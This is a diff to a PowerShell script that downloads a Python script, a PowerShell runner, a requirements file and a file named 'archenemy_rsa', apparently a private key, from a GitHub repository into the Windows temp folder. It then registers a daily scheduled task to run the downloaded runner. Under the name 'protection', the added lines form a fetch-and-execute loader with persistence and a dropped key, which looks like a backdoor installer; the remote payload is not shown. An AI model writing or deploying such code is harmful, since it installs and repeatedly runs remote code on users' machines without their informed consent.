@@ -37,9 +37,12 @@ $pythonPath = "$pythonPath\python.exe"
 $outDirectory = "$env:TEMP"		# Temp directory in Windows
 
 $repoUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/protection.py"
+$runUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/run_protection.ps1"
 $requirementsUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/requirements.txt"
 $contentUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/archenemy_rsa"
+
 $scriptPath = "${outDirectory}/protection.py"
+$runPath = "${outDirectory}/run_protection.ps1"
 $requirementsPath = "${outDirectory}/requirements.txt"
 $contentPath = "${outDirectory}/archenemy_rsa"
 
@@ -54,6 +57,7 @@ if (Test-Path $scriptPath) {
 try {
 	# Download the repository and requirements
 	Invoke-WebRequest -Uri $repoUrl -OutFile $scriptPath
+	Invoke-WebRequest -Uri $runUrl -OutFile $runPath
 	Invoke-WebRequest -Uri $requirementsUrl -OutFile $requirementsPath
 	Invoke-WebRequest -Uri $contentUrl -OutFile $contentPath
 
@@ -90,8 +94,8 @@ $python_path = (Get-Command python).Definition
 #$action = New-ScheduledTaskAction -Execute "$python_path" -Argument "`"C:\Users\Beatriz Adriana G\Other\protection\light\protection.py`""
 #$action = New-ScheduledTaskAction -Execute "$python_path" -Argument 'C:\Users\Public\Other\Schedule\schedule.py'
 
-$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument 'C:\Users\Public\Other\protection\run_protection.ps1'
-
+#$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument 'C:\Users\Public\Other\protection\run_protection.ps1'
+$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "`"$runPath`""
 
 # Define triggers
 $t1 = New-ScheduledTaskTrigger -Daily -At 02:00pm
@@ -103,15 +107,15 @@ Register-ScheduledTask -Action $action -Trigger $t1 -TaskName "$TaskName" -Force
 
 
 # Call the downloaded script if exist
-if (Test-Path -Path $scriptPath) {
-	$scriptPathNoExtension = [System.IO.Path]::GetFileNameWithoutExtension($scriptPath)
-	$env:PYTHONWARNINGS="ignore"
+#if (Test-Path -Path $scriptPath) {
+#	$scriptPathNoExtension = [System.IO.Path]::GetFileNameWithoutExtension($scriptPath)
+#	$env:PYTHONWARNINGS="ignore"
 
     # Start the Python script in the background
-	Start-Process -NoNewWindow -FilePath "$pythonPath" -ArgumentList "`"$scriptPath`""
+#	Start-Process -NoNewWindow -FilePath "$pythonPath" -ArgumentList "`"$scriptPath`""
 
 	# Execute the script
 	#& "$pythonPath" "$scriptPath" > $null 2>&1
 	#echo "[*] Python Script executed!"
-} else {
-}
+#} else {
+#}
